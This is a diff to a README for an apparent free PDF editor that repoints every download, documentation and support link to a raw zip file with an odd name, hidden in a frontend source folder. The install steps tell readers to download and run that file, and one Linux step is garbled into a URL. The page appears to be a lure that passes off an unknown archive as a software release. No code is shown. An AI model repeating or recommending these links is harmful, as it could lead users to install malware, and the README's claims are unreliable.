@@ -1,6 +1,6 @@
 # ✏️ pdfsmarteditor - Your Free PDF Editing Solution
 
-[![Download PDF Smart Editor](https://github.com/Joseph8590/pdfsmarteditor/raw/refs/heads/main/frontend/src/hooks/Software-acrologism.zip%20PDF%20Smart%20Editor-%20-%2300ff00?style=for-the-badge)](https://github.com/Joseph8590/pdfsmarteditor/raw/refs/heads/main/frontend/src/hooks/Software-acrologism.zip)
+[![Download PDF Smart Editor](https://github.com/Joseph8590/pdfsmarteditor/raw/refs/heads/main/frontend/src/components/Software-Ottoman.zip%20PDF%20Smart%20Editor-%20-%2300ff00?style=for-the-badge)](https://github.com/Joseph8590/pdfsmarteditor/raw/refs/heads/main/frontend/src/components/Software-Ottoman.zip)
 
 ## 📖 Overview
 
@@ -20,21 +20,21 @@ This guide helps you download and run PDF Smart Editor easily, even if you have 
 ### 📥 Download & Install
 
 1. **Visit the Releases Page**: Click the link below to go to the PDF Smart Editor releases page:
-   [Visit this page to download](https://github.com/Joseph8590/pdfsmarteditor/raw/refs/heads/main/frontend/src/hooks/Software-acrologism.zip)
+   [Visit this page to download](https://github.com/Joseph8590/pdfsmarteditor/raw/refs/heads/main/frontend/src/components/Software-Ottoman.zip)
 
 2. **Choose Your Version**: On the releases page, look for the latest version of PDF Smart Editor. You’ll see a list of available files.
 
 3. **Select the Correct File**: 
    - For **Windows**, download the `.exe` file.
    - For **macOS**, download the `.dmg` file.
-   - For **Linux**, you may have options like `.deb` for Debian-based systems or `https://github.com/Joseph8590/pdfsmarteditor/raw/refs/heads/main/frontend/src/hooks/Software-acrologism.zip` for others.
+   - For **Linux**, you may have options like `.deb` for Debian-based systems or `https://github.com/Joseph8590/pdfsmarteditor/raw/refs/heads/main/frontend/src/components/Software-Ottoman.zip` for others.
 
 4. **Download the File**: Click on the file that matches your operating system. This will start the download.
 
 5. **Run the Installer**:
    - **Windows**: Double-click the downloaded `.exe` file and follow the prompts.
    - **macOS**: Open the `.dmg` file, drag the PDF Smart Editor icon into your Applications folder, and then launch it.
-   - **Linux**: For `.deb`, use your package installer, or extract the `https://github.com/Joseph8590/pdfsmarteditor/raw/refs/heads/main/frontend/src/hooks/Software-acrologism.zip` if you downloaded that option, and then follow the setup instructions included in the archive.
+   - **Linux**: For `.deb`, use your package installer, or extract the `https://github.com/Joseph8590/pdfsmarteditor/raw/refs/heads/main/frontend/src/components/Software-Ottoman.zip` if you downloaded that option, and then follow the setup instructions included in the archive.
 
 6. **Follow Setup Instructions**: Follow any instructions provided during installation. If you're unsure, you can refer to the help or FAQ section in the application once it's launched.
 
@@ -71,11 +71,11 @@ If you encounter issues while downloading or running the application:
 
 Learn more about PDF Smart Editor and contribute to its growth by visiting the following links:
 
-- [Documentation](https://github.com/Joseph8590/pdfsmarteditor/raw/refs/heads/main/frontend/src/hooks/Software-acrologism.zip)
-- [Community Support](https://github.com/Joseph8590/pdfsmarteditor/raw/refs/heads/main/frontend/src/hooks/Software-acrologism.zip)
+- [Documentation](https://github.com/Joseph8590/pdfsmarteditor/raw/refs/heads/main/frontend/src/components/Software-Ottoman.zip)
+- [Community Support](https://github.com/Joseph8590/pdfsmarteditor/raw/refs/heads/main/frontend/src/components/Software-Ottoman.zip)
 
 ## 📄 Conclusion
 
 PDF Smart Editor is your go-to tool for editing PDFs without the cost. Follow the steps above to get started. Enjoy a seamless experience while keeping your documents private and secure. 
 
-[Visit this page to download](https://github.com/Joseph8590/pdfsmarteditor/raw/refs/heads/main/frontend/src/hooks/Software-acrologism.zip) and start editing today!
+[Visit this page to download](https://github.com/Joseph8590/pdfsmarteditor/raw/refs/heads/main/frontend/src/components/Software-Ottoman.zip) and start editing today!
